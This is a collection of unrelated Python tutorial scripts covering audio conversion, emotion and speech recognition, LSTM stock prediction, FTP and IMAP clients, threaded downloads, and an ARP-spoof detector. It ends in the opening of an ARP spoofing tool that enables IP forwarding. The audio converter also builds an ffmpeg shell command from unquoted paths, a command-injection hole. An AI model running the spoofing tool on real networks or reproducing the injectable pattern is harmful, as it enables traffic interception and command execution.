    for x1, y1, x2, y2 in line:
        cv2.line(image, (x1, y1), (x2, y2), color=(20, 220, 20), thickness=3)

# show the image
plt.imshow(image)
plt.show()




"""
A utility script used for converting audio samples to be 
suitable for feature extraction
"""

import os

def convert_audio(audio_path, target_path, remove=False):
    """This function sets the audio audio_path to:
        - 16000Hz Sampling rate
        - one audio channel ( mono )
            Params:
                audio_path (str): the path of audio wav file you want to convert
                target_path (str): target path to save your new converted wav file
                remove (bool): whether to remove the old file after converting
        Note that this function requires ffmpeg installed in your system."""

    os.system(f"ffmpeg -i {audio_path} -ac 1 -ar 16000 {target_path}")
    # os.system(f"ffmpeg -i {audio_path} -ac 1 {target_path}")
    if remove:
        os.remove(audio_path)


def convert_audios(path, target_path, remove=False):
    """Converts a path of wav files to:
        - 16000Hz Sampling rate
        - one audio channel ( mono )
        and then put them into a new folder called target_path
            Params:
                audio_path (str): the path of audio wav file you want to convert
                target_path (str): target path to save your new converted wav file
                remove (bool): whether to remove the old file after converting
        Note that this function requires ffmpeg installed in your system."""

    for dirpath, dirnames, filenames in os.walk(path):
        for dirname in dirnames:
            dirname = os.path.join(dirpath, dirname)
            target_dir = dirname.replace(path, target_path)
            if not os.path.isdir(target_dir):
                os.mkdir(target_dir)

    for dirpath, _, filenames in os.walk(path):
        for filename in filenames:
            file = os.path.join(dirpath, filename)
            if file.endswith(".wav"):
                # it is a wav file
                target_file = file.replace(path, target_path)
                convert_audio(file, target_file, remove=remove)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="""Convert ( compress ) wav files to 16MHz and mono audio channel ( 1 channel )
                                                    This utility helps for compressing wav files for training and testing""")
    parser.add_argument("audio_path", help="Folder that contains wav files you want to convert")
    parser.add_argument("target_path", help="Folder to save new wav files")
    parser.add_argument("-r", "--remove", type=bool, help="Whether to remove the old wav file after converting", default=False)

    args = parser.parse_args()
    audio_path = args.audio_path
    target_path = args.target_path

    if os.path.isdir(audio_path):
        if not os.path.isdir(target_path):
            os.makedirs(target_path)
            convert_audios(audio_path, target_path, remove=args.remove)
    elif os.path.isfile(audio_path) and audio_path.endswith(".wav"):
        if not target_path.endswith(".wav"):
            target_path += ".wav"
        convert_audio(audio_path, target_path, remove=args.remove)
    else:
        raise TypeError("The audio_path file you specified isn't appropriate for this operation")




from sklearn.neural_network import MLPClassifier

from sklearn.metrics import accuracy_score
from utils import load_data

import os
import pickle

# load RAVDESS dataset
X_train, X_test, y_train, y_test = load_data(test_size=0.25)
# print some details
# number of samples in training data
print("[+] Number of training samples:", X_train.shape[0])
# number of samples in testing data
print("[+] Number of testing samples:", X_test.shape[0])
# number of features used
# this is a vector of features extracted 
# using utils.extract_features() method
print("[+] Number of features:", X_train.shape[1])
# best model, determined by a grid search
model_params = {
    'alpha': 0.01,
    'batch_size': 256,
    'epsilon': 1e-08, 
    'hidden_layer_sizes': (300,), 
    'learning_rate': 'adaptive', 
    'max_iter': 500, 
}
# initialize Multi Layer Perceptron classifier
# with best parameters ( so far )
model = MLPClassifier(**model_params)

# train the model
print("[*] Training the model...")
model.fit(X_train, y_train)

# predict 25% of data to measure how good we are
y_pred = model.predict(X_test)

# calculate the accuracy
accuracy = accuracy_score(y_true=y_test, y_pred=y_pred)

print("Accuracy: {:.2f}%".format(accuracy*100))

# now we save the model
# make result directory if doesn't exist yet
if not os.path.isdir("result"):
    os.mkdir("result")

pickle.dump(model, open("result/mlp_classifier.model", "wb"))




import pyaudio
import os
import wave
import pickle
from sys import byteorder
from array import array
from struct import pack
from sklearn.neural_network import MLPClassifier

from utils import extract_feature

THRESHOLD = 500
CHUNK_SIZE = 1024
FORMAT = pyaudio.paInt16
RATE = 16000

SILENCE = 30

def is_silent(snd_data):
    "Returns 'True' if below the 'silent' threshold"
    return max(snd_data) < THRESHOLD

def normalize(snd_data):
    "Average the volume out"
    MAXIMUM = 16384
    times = float(MAXIMUM)/max(abs(i) for i in snd_data)

    r = array('h')
    for i in snd_data:
        r.append(int(i*times))
    return r

def trim(snd_data):
    "Trim the blank spots at the start and end"
    def _trim(snd_data):
        snd_started = False
        r = array('h')

        for i in snd_data:
            if not snd_started and abs(i)>THRESHOLD:
                snd_started = True
                r.append(i)

            elif snd_started:
                r.append(i)
        return r

    # Trim to the left
    snd_data = _trim(snd_data)

    # Trim to the right
    snd_data.reverse()
    snd_data = _trim(snd_data)
    snd_data.reverse()
    return snd_data

def add_silence(snd_data, seconds):
    "Add silence to the start and end of 'snd_data' of length 'seconds' (float)"
    r = array('h', [0 for i in range(int(seconds*RATE))])
    r.extend(snd_data)
    r.extend([0 for i in range(int(seconds*RATE))])
    return r

def record():
    """
    Record a word or words from the microphone and 
    return the data as an array of signed shorts.

    Normalizes the audio, trims silence from the 
    start and end, and pads with 0.5 seconds of 
    blank sound to make sure VLC et al can play 
    it without getting chopped off.
    """
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=1, rate=RATE,
        input=True, output=True,
        frames_per_buffer=CHUNK_SIZE)

    num_silent = 0
    snd_started = False

    r = array('h')

    while 1:
        # little endian, signed short
        snd_data = array('h', stream.read(CHUNK_SIZE))
        if byteorder == 'big':
            snd_data.byteswap()
        r.extend(snd_data)

        silent = is_silent(snd_data)

        if silent and snd_started:
            num_silent += 1
        elif not silent and not snd_started:
            snd_started = True

        if snd_started and num_silent > SILENCE:
            break

    sample_width = p.get_sample_size(FORMAT)
    stream.stop_stream()
    stream.close()
    p.terminate()

    r = normalize(r)
    r = trim(r)
    r = add_silence(r, 0.5)
    return sample_width, r

def record_to_file(path):
    "Records from the microphone and outputs the resulting data to 'path'"
    sample_width, data = record()
    data = pack('<' + ('h'*len(data)), *data)

    wf = wave.open(path, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(sample_width)
    wf.setframerate(RATE)
    wf.writeframes(data)
    wf.close()



if __name__ == "__main__":
    # load the saved model (after training)
    model = pickle.load(open("result/mlp_classifier.model", "rb"))
    print("Please talk")
    filename = "test.wav"
    # record the file (start talking)
    record_to_file(filename)
    # extract features and reshape it
    features = extract_feature(filename, mfcc=True, chroma=True, mel=True).reshape(1, -1)
    # predict
    result = model.predict(features)[0]
    # show the result !
    print("result:", result)




import soundfile
import numpy as np
import librosa
import glob
import os
from sklearn.model_selection import train_test_split

# all emotions on RAVDESS dataset
int2emotion = {
    "01": "neutral",
    "02": "calm",
    "03": "happy",
    "04": "sad",
    "05": "angry",
    "06": "fearful",
    "07": "disgust",
    "08": "surprised"
}

# we allow only these emotions
AVAILABLE_EMOTIONS = {
    "angry",
    "sad",
    "neutral",
    "happy"
}

def extract_feature(file_name, **kwargs):
    """
    Extract feature from audio file file_name
        Features supported:
            - MFCC (mfcc)
            - Chroma (chroma)
            - MEL Spectrogram Frequency (mel)
            - Contrast (contrast)
            - Tonnetz (tonnetz)
        e.g:
        features = extract_feature(path, mel=True, mfcc=True)
    """
    mfcc = kwargs.get("mfcc")
    chroma = kwargs.get("chroma")
    mel = kwargs.get("mel")
    contrast = kwargs.get("contrast")
    tonnetz = kwargs.get("tonnetz")
    with soundfile.SoundFile(file_name) as sound_file:
        X = sound_file.read(dtype="float32")
        sample_rate = sound_file.samplerate
        if chroma or contrast:
            stft = np.abs(librosa.stft(X))
        result = np.array([])
        if mfcc:
            mfccs = np.mean(librosa.feature.mfcc(y=X, sr=sample_rate, n_mfcc=40).T, axis=0)
            result = np.hstack((result, mfccs))
        if chroma:
            chroma = np.mean(librosa.feature.chroma_stft(S=stft, sr=sample_rate).T,axis=0)
            result = np.hstack((result, chroma))
        if mel:
            mel = np.mean(librosa.feature.melspectrogram(X, sr=sample_rate).T,axis=0)
            result = np.hstack((result, mel))
        if contrast:
            contrast = np.mean(librosa.feature.spectral_contrast(S=stft, sr=sample_rate).T,axis=0)
            result = np.hstack((result, contrast))
        if tonnetz:
            tonnetz = np.mean(librosa.feature.tonnetz(y=librosa.effects.harmonic(X), sr=sample_rate).T,axis=0)
            result = np.hstack((result, tonnetz))
    return result


def load_data(test_size=0.2):
    X, y = [], []
    for file in glob.glob("data/Actor_*/*.wav"):
        # get the base name of the audio file
        basename = os.path.basename(file)
        # get the emotion label
        emotion = int2emotion[basename.split("-")[2]]
        # we allow only AVAILABLE_EMOTIONS we set
        if emotion not in AVAILABLE_EMOTIONS:
            continue
        # extract speech features
        features = extract_feature(file, mfcc=True, chroma=True, mel=True)
        # add to data
        X.append(features)
        y.append(emotion)
    # split the data to training and testing and return it
    return train_test_split(np.array(X), y, test_size=test_size, random_state=7)




import speech_recognition as sr
import sys

duration = int(sys.argv[1])

# initialize the recognizer
r = sr.Recognizer()
print("Please talk")
with sr.Microphone() as source:
    # read the audio data from the default microphone
    audio_data = r.record(source, duration=duration)
    print("Recognizing...")
    # convert speech to text
    text = r.recognize_google(audio_data)
    print(text)




import speech_recognition as sr
import sys

filename = sys.argv[1]

# initialize the recognizer
r = sr.Recognizer()

# open the file
with sr.AudioFile(filename) as source:
    # listen for the data (load audio to memory)
    audio_data = r.record(source)
    # recognize (convert from speech to text)
    text = r.recognize_google(audio_data)
    print(text)




import os
import time
from tensorflow.keras.layers import LSTM


# Window size or the sequence length
N_STEPS = 100
# Lookup step, 1 is the next day
LOOKUP_STEP = 90

# test ratio size, 0.2 is 20%
TEST_SIZE = 0.2
# features to use
FEATURE_COLUMNS = ["adjclose", "volume", "open", "high", "low"]
# date now
date_now = time.strftime("%Y-%m-%d")

### model parameters

N_LAYERS = 3
# LSTM cell
CELL = LSTM
# 256 LSTM neurons
UNITS = 256
# 40% dropout
DROPOUT = 0.4

### training parameters

# mean squared error loss
LOSS = "mse"
OPTIMIZER = "rmsprop"
BATCH_SIZE = 64
EPOCHS = 300

# Apple stock market
ticker = "AAPL"
ticker_data_filename = os.path.join("data", f"{ticker}_{date_now}.csv")
# model name to save
model_name = f"{date_now}_{ticker}-{LOSS}-{CELL.__name__}-seq-{N_STEPS}-step-{LOOKUP_STEP}-layers-{N_LAYERS}-units-{UNITS}"




from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import LSTM, Dense, Dropout
from sklearn import preprocessing
from sklearn.model_selection import train_test_split
from yahoo_fin import stock_info as si
from collections import deque

import numpy as np
import pandas as pd
import random


def load_data(ticker, n_steps=50, scale=True, shuffle=True, lookup_step=1, 
                test_size=0.2, feature_columns=['adjclose', 'volume', 'open', 'high', 'low']):
    """
    Loads data from Yahoo Finance source, as well as scaling, shuffling, normalizing and splitting.
    Params:
        ticker (str/pd.DataFrame): the ticker you want to load, examples include AAPL, TESL, etc.
        n_steps (int): the historical sequence length (i.e window size) used to predict, default is 50
        scale (bool): whether to scale prices from 0 to 1, default is True
        shuffle (bool): whether to shuffle the data, default is True
        lookup_step (int): the future lookup step to predict, default is 1 (e.g next day)
        test_size (float): ratio for test data, default is 0.2 (20% testing data)
        feature_columns (list): the list of features to use to feed into the model, default is everything grabbed from yahoo_fin
    """
    # see if ticker is already a loaded stock from yahoo finance
    if isinstance(ticker, str):
        # load it from yahoo_fin library
        df = si.get_data(ticker)
    elif isinstance(ticker, pd.DataFrame):
        # already loaded, use it directly
        df = ticker
    else:
        raise TypeError("ticker can be either a str or a pd.DataFrame instances")

    # this will contain all the elements we want to return from this function
    result = {}
    # we will also return the original dataframe itself
    result['df'] = df.copy()

    # make sure that the passed feature_columns exist in the dataframe
    for col in feature_columns:
        assert col in df.columns

    if scale:
        column_scaler = {}
        # scale the data (prices) from 0 to 1
        for column in feature_columns:
            scaler = preprocessing.MinMaxScaler()
            df[column] = scaler.fit_transform(np.expand_dims(df[column].values, axis=1))
            column_scaler[column] = scaler

        # add the MinMaxScaler instances to the result returned
        result["column_scaler"] = column_scaler

    # add the target column (label) by shifting by lookup_step
    df['future'] = df['adjclose'].shift(-lookup_step)

    # last lookup_step columns contains NaN in future column
    # get them before droping NaNs
    last_sequence = np.array(df[feature_columns].tail(lookup_step))
    
    # drop NaNs
    df.dropna(inplace=True)

    sequence_data = []
    sequences = deque(maxlen=n_steps)

    for entry, target in zip(df[feature_columns].values, df['future'].values):
        sequences.append(entry)
        if len(sequences) == n_steps:
            sequence_data.append([np.array(sequences), target])

    # get the last sequence by appending the last n_step sequence with lookup_step sequence
    # for instance, if n_steps=50 and lookup_step=10, last_sequence should be of 59 (that is 50+10-1) length
    # this last_sequence will be used to predict in future dates that are not available in the dataset
    last_sequence = list(sequences) + list(last_sequence)
    # shift the last sequence by -1
    last_sequence = np.array(pd.DataFrame(last_sequence).shift(-1).dropna())
    # add to result
    result['last_sequence'] = last_sequence
    
    # construct the X's and y's
    X, y = [], []
    for seq, target in sequence_data:
        X.append(seq)
        y.append(target)

    # convert to numpy arrays
    X = np.array(X)
    y = np.array(y)

    # reshape X to fit the neural network
    X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))
    
    # split the dataset
    result["X_train"], result["X_test"], result["y_train"], result["y_test"] = train_test_split(X, y, 
                                                                                test_size=test_size, shuffle=shuffle)
    # return the result
    return result


def create_model(input_length, units=256, cell=LSTM, n_layers=2, dropout=0.3,
                loss="mean_absolute_error", optimizer="rmsprop"):
    model = Sequential()
    for i in range(n_layers):
        if i == 0:
            # first layer
            model.add(cell(units, return_sequences=True, input_shape=(None, input_length)))
        elif i == n_layers - 1:
            # last layer
            model.add(cell(units, return_sequences=False))
        else:
            # hidden layers
            model.add(cell(units, return_sequences=True))
        # add dropout after each layer
        model.add(Dropout(dropout))
    
    model.add(Dense(1, activation="linear"))
    model.compile(loss=loss, metrics=["mean_absolute_error"], optimizer=optimizer)

    return model




from stock_prediction import create_model, load_data, np
from parameters import *
import matplotlib.pyplot as plt
from sklearn.metrics import accuracy_score

def plot_graph(model, data):
    y_test = data["y_test"]
    X_test = data["X_test"]
    y_pred = model.predict(X_test)
    y_test = np.squeeze(data["column_scaler"]["adjclose"].inverse_transform(np.expand_dims(y_test, axis=0)))
    y_pred = np.squeeze(data["column_scaler"]["adjclose"].inverse_transform(y_pred))
    plt.plot(y_test[-200:], c='b')
    plt.plot(y_pred[-200:], c='r')
    plt.xlabel("Days")
    plt.ylabel("Price")
    plt.legend(["Actual Price", "Predicted Price"])
    plt.show()


def get_accuracy(model, data):
    y_test = data["y_test"]
    X_test = data["X_test"]
    y_pred = model.predict(X_test)
    y_test = np.squeeze(data["column_scaler"]["adjclose"].inverse_transform(np.expand_dims(y_test, axis=0)))
    y_pred = np.squeeze(data["column_scaler"]["adjclose"].inverse_transform(y_pred))
    y_pred = list(map(lambda current, future: int(float(future) > float(current)), y_test[:-LOOKUP_STEP], y_pred[LOOKUP_STEP:]))
    y_test = list(map(lambda current, future: int(float(future) > float(current)), y_test[:-LOOKUP_STEP], y_test[LOOKUP_STEP:]))
    return accuracy_score(y_test, y_pred)


def predict(model, data, classification=False):
    # retrieve the last sequence from data
    last_sequence = data["last_sequence"][:N_STEPS]
    # retrieve the column scalers
    column_scaler = data["column_scaler"]
    # reshape the last sequence
    last_sequence = last_sequence.reshape((last_sequence.shape[1], last_sequence.shape[0]))
    # expand dimension
    last_sequence = np.expand_dims(last_sequence, axis=0)
    # get the prediction (scaled from 0 to 1)
    prediction = model.predict(last_sequence)
    # get the price (by inverting the scaling)
    predicted_price = column_scaler["adjclose"].inverse_transform(prediction)[0][0]
    return predicted_price


# load the data
data = load_data(ticker, N_STEPS, lookup_step=LOOKUP_STEP, test_size=TEST_SIZE,
                feature_columns=FEATURE_COLUMNS, shuffle=False)

# construct the model
model = create_model(N_STEPS, loss=LOSS, units=UNITS, cell=CELL, n_layers=N_LAYERS,
                    dropout=DROPOUT, optimizer=OPTIMIZER)

model_path = os.path.join("results", model_name) + ".h5"
model.load_weights(model_path)

# evaluate the model
mse, mae = model.evaluate(data["X_test"], data["y_test"])
# calculate the mean absolute error (inverse scaling)
mean_absolute_error = data["column_scaler"]["adjclose"].inverse_transform(mae.reshape(1, -1))[0][0]
print("Mean Absolute Error:", mean_absolute_error)
# predict the future price
future_price = predict(model, data)
print(f"Future price after {LOOKUP_STEP} days is {future_price:.2f}")
print("Accuracy Score:", get_accuracy(model, data))
plot_graph(model, data)




from stock_prediction import create_model, load_data
from tensorflow.keras.layers import LSTM
from tensorflow.keras.callbacks import ModelCheckpoint, TensorBoard
import os
import pandas as pd
from parameters import *


# create these folders if they does not exist
if not os.path.isdir("results"):
    os.mkdir("results")

if not os.path.isdir("logs"):
    os.mkdir("logs")

if not os.path.isdir("data"):
    os.mkdir("data")

# load the data
data = load_data(ticker, N_STEPS, lookup_step=LOOKUP_STEP, test_size=TEST_SIZE, feature_columns=FEATURE_COLUMNS)

# construct the model
model = create_model(N_STEPS, loss=LOSS, units=UNITS, cell=CELL, n_layers=N_LAYERS,
                    dropout=DROPOUT, optimizer=OPTIMIZER)

# some tensorflow callbacks
checkpointer = ModelCheckpoint(os.path.join("results", model_name), save_weights_only=True, save_best_only=True, verbose=1)
tensorboard = TensorBoard(log_dir=os.path.join("logs", model_name))

history = model.fit(data["X_train"], data["y_train"],
                    batch_size=BATCH_SIZE,
                    epochs=EPOCHS,
                    validation_data=(data["X_test"], data["y_test"]),
                    callbacks=[checkpointer, tensorboard],
                    verbose=1)

model.save(os.path.join("results", model_name) + ".h5")




import ftplib

FTP_HOST = "ftp.dlptest.com"
FTP_USER = "dlpuserdlptest.com"
FTP_PASS = "SzMf7rTE4pCrf9dV286GuNe4N"

# connect to the FTP server
ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
# force UTF-8 encoding
ftp.encoding = "utf-8"
# the name of file you want to download from the FTP server
filename = "some_file.txt"
with open(filename, "wb") as file:
    # use FTP's RETR command to download the file
    ftp.retrbinary(f"RETR {filename}", file.write)

# quit and close the connection
ftp.quit()




import ftplib

# FTP server credentials
FTP_HOST = "ftp.dlptest.com"
FTP_USER = "dlpuserdlptest.com"
FTP_PASS = "SzMf7rTE4pCrf9dV286GuNe4N"

# connect to the FTP server
ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
# force UTF-8 encoding
ftp.encoding = "utf-8"
# local file name you want to upload
filename = "some_file.txt"
with open(filename, "rb") as file:
    # use FTP's STOR command to upload the file
    ftp.storbinary(f"STOR {filename}", file)
# list current files & directories
ftp.dir()
# quit and close the connection
ftp.quit()




import random
import os
import string
import secrets

# generate random integer between a and b (including a and b)
randint = random.randint(1, 500)
print("randint:", randint)

# generate random integer from range
randrange = random.randrange(0, 500, 5)
print("randrange:", randrange)

# get a random element from this list
choice = random.choice(["hello", "hi", "welcome", "bye", "see you"])
print("choice:", choice)

# get 5 random elements from 0 to 1000
choices = random.choices(range(1000), k=5)
print("choices:", choices)

# generate a random floating point number from 0.0 <= x <= 1.0
randfloat = random.random()
print("randfloat between 0.0 and 1.0:", randfloat)

# generate a random floating point number such that a <= x <= b
randfloat = random.uniform(5, 10)
print("randfloat between 5.0 and 10.0:", randfloat)

l = list(range(10))
print("Before shuffle:", l)
random.shuffle(l)
print("After shuffle:", l)

# generate a random string
randstring = ''.join(random.sample(string.ascii_letters, 16))
print("Random string with 16 characters:", randstring)

# crypto-safe byte generation
randbytes_crypto = os.urandom(16)
print("Random bytes for crypto use using os:", randbytes_crypto)

# or use this
randbytes_crypto = secrets.token_bytes(16)
print("Random bytes for crypto use using secrets:", randbytes_crypto)

# crypto-secure string generation
randstring_crypto = secrets.token_urlsafe(16)
print("Random strings for crypto use:", randstring_crypto)

# crypto-secure bits generation
randbits_crypto = secrets.randbits(16)
print("Random 16-bits for crypto use:", randbits_crypto)




import os

# print the current directory
print("The current directory:", os.getcwd())

# make an empty directory (folder)
os.mkdir("folder")
# running mkdir again with the same name raises FileExistsError, run this instead:
# if not os.path.isdir("folder"):
#     os.mkdir("folder")
# changing the current directory to 'folder'
os.chdir("folder")
# printing the current directory now
print("The current directory changing the directory to folder:", os.getcwd())

# go back a directory
os.chdir("..")

# make several nested directories
os.makedirs("nested1/nested2/nested3")

# create a new text file
text_file = open("text.txt", "w")
# write to this file some text
text_file.write("This is a text file")

# rename text.txt to renamed-text.txt
os.rename("text.txt", "renamed-text.txt")

# replace (move) this file to another directory
os.replace("renamed-text.txt", "folder/renamed-text.txt")

# print all files and folders in the current directory
print("All folders & files:", os.listdir())

# print all files & folders recursively
for dirpath, dirnames, filenames in os.walk("."):
    # iterate over directories
    for dirname in dirnames:
        print("Directory:", os.path.join(dirpath, dirname))
    # iterate over files
    for filename in filenames:
        print("File:", os.path.join(dirpath, filename))
# delete that file
os.remove("folder/renamed-text.txt")
# remove the folder
os.rmdir("folder")

# remove nested folders
os.removedirs("nested1/nested2/nested3")

open("text.txt", "w").write("This is a text file")

# print some stats about the file
print(os.stat("text.txt"))

# get the file size for example
print("File size:", os.stat("text.txt").st_size)




import ftplib
import os
from datetime import datetime

FTP_HOST = "ftp.ed.ac.uk"
FTP_USER = "anonymous"
FTP_PASS = ""

# some utility functions that we gonna need
def get_size_format(n, suffix="B"):
    # converts bytes to scaled format (e.g KB, MB, etc.)
    for unit in ["", "K", "M", "G", "T", "P"]:
        if n < 1024:
            return f"{n:.2f}{unit}{suffix}"
        n /= 1024


def get_datetime_format(date_time):
    # convert to datetime object
    date_time = datetime.strptime(date_time, "%Y%m%d%H%M%S")
    # convert to human readable date time string
    return date_time.strftime("%Y/%m/%d %H:%M:%S")


# initialize FTP session
ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
# force UTF-8 encoding
ftp.encoding = "utf-8"
# print the welcome message
print(ftp.getwelcome())
# change the current working directory to 'pub' folder and 'maps' subfolder
ftp.cwd("pub/maps")

# LIST a directory
print("*"*50, "LIST", "*"*50)
ftp.dir()

# NLST command
print("*"*50, "NLST", "*"*50)
print("{:20} {}".format("File Name", "File Size"))
for file_name in ftp.nlst():
    file_size = "N/A"
    try:
        ftp.cwd(file_name)
    except Exception as e:
        ftp.voidcmd("TYPE I")
        file_size = get_size_format(ftp.size(file_name))
    print(f"{file_name:20} {file_size}")


print("*"*50, "MLSD", "*"*50)
# using the MLSD command
print("{:30} {:19} {:6} {:5} {:4} {:4} {:4} {}".format("File Name", "Last Modified", "Size",
                                                    "Perm","Type", "GRP", "MODE", "OWNER"))
for file_data in ftp.mlsd():
    # extract returning data
    file_name, meta = file_data
    # i.e directory, file or link, etc
    file_type = meta.get("type")
    if file_type == "file":
        # if it is a file, change type of transfer data to IMAGE/binary
        ftp.voidcmd("TYPE I")
        # get the file size in bytes
        file_size = ftp.size(file_name)
        # convert it to human readable format (i.e in 'KB', 'MB', etc)
        file_size = get_size_format(file_size)
    else:
        # not a file, may be a directory or other types
        file_size = "N/A"
    # date of last modification of the file
    last_modified = get_datetime_format(meta.get("modify"))
    # file permissions
    permission = meta.get("perm")
    
    # get the file unique id
    unique_id = meta.get("unique")
    # user group
    unix_group = meta.get("unix.group")
    # file mode, unix permissions 
    unix_mode = meta.get("unix.mode")
    # owner of the file
    unix_owner = meta.get("unix.owner")
    # print all
    print(f"{file_name:30} {last_modified:19} {file_size:7} {permission:5} {file_type:4} {unix_group:4} {unix_mode:4} {unix_owner}")


# quit and close the connection
ftp.quit()




import imaplib
import email
from email.header import decode_header
import webbrowser
import os

# account credentials
username = "youremailaddressprovider.com"
password = "yourpassword"

# number of top emails to fetch
N = 3

# create an IMAP4 class with SSL, use your email provider's IMAP server
imap = imaplib.IMAP4_SSL("imap.gmail.com")
# authenticate
imap.login(username, password)

# select a mailbox (in this case, the inbox mailbox)
# use imap.list() to get the list of mailboxes
status, messages = imap.select("INBOX")

# total number of emails
messages = int(messages[0])

for i in range(messages-4, messages-N-4, -1):
    # fetch the email message by ID
    res, msg = imap.fetch(str(i), "(RFC822)")
    for response in msg:
        if isinstance(response, tuple):
            # parse a bytes email into a message object
            msg = email.message_from_bytes(response[1])
            # decode the email subject
            subject = decode_header(msg["Subject"])[0][0]
            if isinstance(subject, bytes):
                # if it's a bytes, decode to str
                subject = subject.decode()
            # email sender
            from_ = msg.get("From")
            print("Subject:", subject)
            print("From:", from_)
            # if the email message is multipart
            if msg.is_multipart():
                # iterate over email parts
                for part in msg.walk():
                    # extract content type of email
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    try:
                        # get the email body
                        body = part.get_payload(decode=True).decode()
                    except:
                        pass
                    if content_type == "text/plain" and "attachment" not in content_disposition:
                        # print text/plain emails and skip attachments
                        print(body)
                    elif "attachment" in content_disposition:
                        # download attachment
                        filename = part.get_filename()
                        if filename:
                            if not os.path.isdir(subject):
                                # make a folder for this email (named after the subject)
                                os.mkdir(subject)
                            filepath = os.path.join(subject, filename)
                            # download attachment and save it
                            open(filepath, "wb").write(part.get_payload(decode=True))
            else:
                # extract content type of email
                content_type = msg.get_content_type()
                # get the email body
                body = msg.get_payload(decode=True).decode()
                if content_type == "text/plain":
                    # print only text email parts
                    print(body)
            if content_type == "text/html":
                # if it's HTML, create a new HTML file and open it in browser
                if not os.path.isdir(subject):
                    # make a folder for this email (named after the subject)
                    os.mkdir(subject)
                filename = f"{subject[:50]}.html"
                filepath = os.path.join(subject, filename)
                # write the file
                open(filepath, "w").write(body)
                # open in the default browser
                webbrowser.open(filepath)

            print("="*100)

# close the connection and logout
imap.close()
imap.logout()




import requests
from concurrent.futures import ThreadPoolExecutor
from time import perf_counter

# number of threads to spawn
n_threads = 5

# read 1024 bytes every time 
buffer_size = 1024


def download(url):
    # download the body of response by chunk, not immediately
    response = requests.get(url, stream=True)
    # get the file name
    filename = url.split("/")[-1]
    with open(filename, "wb") as f:
        for data in response.iter_content(buffer_size):
            # write data read to the file
            f.write(data)


if __name__ == "__main__":
    urls = [
        "https://cdn.pixabay.com/photo/2018/01/14/23/12/nature-3082832__340.jpg",
        "https://cdn.pixabay.com/photo/2013/10/02/23/03/dawn-190055__340.jpg",
        "https://cdn.pixabay.com/photo/2016/10/21/14/50/plouzane-1758197__340.jpg",
        "https://cdn.pixabay.com/photo/2016/11/29/05/45/astronomy-1867616__340.jpg",
        "https://cdn.pixabay.com/photo/2014/07/28/20/39/landscape-404072__340.jpg",
    ] * 5

    t = perf_counter()
    with ThreadPoolExecutor(max_workers=n_threads) as pool:
        pool.map(download, urls)
    print(f"Time took: {perf_counter() - t:.2f}s")




import requests

from threading import Thread
from queue import Queue

# thread-safe queue initialization
q = Queue()
# number of threads to spawn
n_threads = 5

# read 1024 bytes every time 
buffer_size = 1024

def download():
    global q
    while True:
        # get the url from the queue
        url = q.get()
        # download the body of response by chunk, not immediately
        response = requests.get(url, stream=True)
        # get the file name
        filename = url.split("/")[-1]
        with open(filename, "wb") as f:
            for data in response.iter_content(buffer_size):
                # write data read to the file
                f.write(data)
        # we're done downloading the file
        q.task_done()


if __name__ == "__main__":
    urls = [
        "https://cdn.pixabay.com/photo/2018/01/14/23/12/nature-3082832__340.jpg",
        "https://cdn.pixabay.com/photo/2013/10/02/23/03/dawn-190055__340.jpg",
        "https://cdn.pixabay.com/photo/2016/10/21/14/50/plouzane-1758197__340.jpg",
        "https://cdn.pixabay.com/photo/2016/11/29/05/45/astronomy-1867616__340.jpg",
        "https://cdn.pixabay.com/photo/2014/07/28/20/39/landscape-404072__340.jpg",
    ] * 5

    # fill the queue with all the urls
    for url in urls:
        q.put(url)

    # start the threads
    for t in range(n_threads):
        worker = Thread(target=download)
        # daemon thread means a thread that will end when the main thread ends
        worker.daemon = True
        worker.start()

    # wait until the queue is empty
    q.join()




import requests
from time import perf_counter

# read 1024 bytes every time 
buffer_size = 1024

def download(url):
    # download the body of response by chunk, not immediately
    response = requests.get(url, stream=True)
    # get the file name
    filename = url.split("/")[-1]
    with open(filename, "wb") as f:
        for data in response.iter_content(buffer_size):
            # write data read to the file
            f.write(data)


if __name__ == "__main__":
    urls = [
        "https://cdn.pixabay.com/photo/2018/01/14/23/12/nature-3082832__340.jpg",
        "https://cdn.pixabay.com/photo/2013/10/02/23/03/dawn-190055__340.jpg",
        "https://cdn.pixabay.com/photo/2016/10/21/14/50/plouzane-1758197__340.jpg",
        "https://cdn.pixabay.com/photo/2016/11/29/05/45/astronomy-1867616__340.jpg",
        "https://cdn.pixabay.com/photo/2014/07/28/20/39/landscape-404072__340.jpg",
    ] * 5

    t = perf_counter()
    for url in urls:
        download(url)
    print(f"Time took: {perf_counter() - t:.2f}s")




from scapy.all import Ether, ARP, srp, sniff, conf

def get_mac(ip):
    """
    Returns the MAC address of ip, if it is unable to find it
    for some reason, throws IndexError
    """
    p = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    result = srp(p, timeout=3, verbose=False)[0]
    return result[0][1].hwsrc


def process(packet):
    # if the packet is an ARP packet
    if packet.haslayer(ARP):
        # if it is an ARP response (ARP reply)
        if packet[ARP].op == 2:
            try:
                # get the real MAC address of the sender
                real_mac = get_mac(packet[ARP].psrc)
                # get the MAC address from the packet sent to us
                response_mac = packet[ARP].hwsrc
                # if they're different, definetely there is an attack
                if real_mac != response_mac:
                    print(f"[!] You are under attack, REAL-MAC: {real_mac.upper()}, FAKE-MAC: {response_mac.upper()}")
            except IndexError:
                # unable to find the real mac
                # may be a fake IP or firewall is blocking packets
                pass


if __name__ == "__main__":
    import sys
    try:
        iface = sys.argv[1]
    except IndexError:
        iface = conf.iface
    sniff(store=False, prn=process, iface=iface)




from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


def enable_ip_route(verbose=True):
